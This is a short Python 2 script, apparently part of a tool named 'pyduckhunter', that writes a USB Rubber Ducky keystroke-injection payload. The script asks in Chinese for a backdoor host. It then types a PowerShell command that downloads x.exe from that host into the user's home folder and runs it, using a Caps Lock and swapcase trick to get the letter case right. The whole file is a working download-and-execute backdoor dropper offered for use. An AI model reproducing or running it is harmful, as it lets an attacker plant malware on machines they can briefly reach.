#!/usr/bin/python env
#-*-coding:utf-8-*-
#####powershell_Download_Excute#####
#####调用powershell下载并执行#####
import sys,os
sys.dont_write_bytecode = True
def Excute():

            lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入下载后门地址:")

            f = open('output/Powershell_Download_and_Execute.txt', 'w')

            f.write("CAPSLOCK\n")

            f.write("DELAY 1000\n")

            f.write("GUI r\n")

            f.write("DELAY 1000\n")

            f.write("STRING cmd\n")

            f.write("DELAY 1000\n")

            f.write("STRING ")

            shellout = "powershell -Command $clnt = new-object System.Net.WebClient;$url=http://" + lhost + "/x.exe';$file = ' %HOMEPATH%\\x.exe ';$clnt.DownloadFile($url,$file);\n"

            f.write(shellout.swapcase())

            f.write("DELAY 1000\n")

            f.write("STRING ")

            f.write("%HOMEPATH%\\x.exe;\n")

            f.close()

            f = open('output/Powershell_Download_and_Execute.txt', 'r')

            f.readlines()

            print "[\033[1;32;1m+\033[0m] 文件生成在 output/Powershell_Download_and_Execute.txt"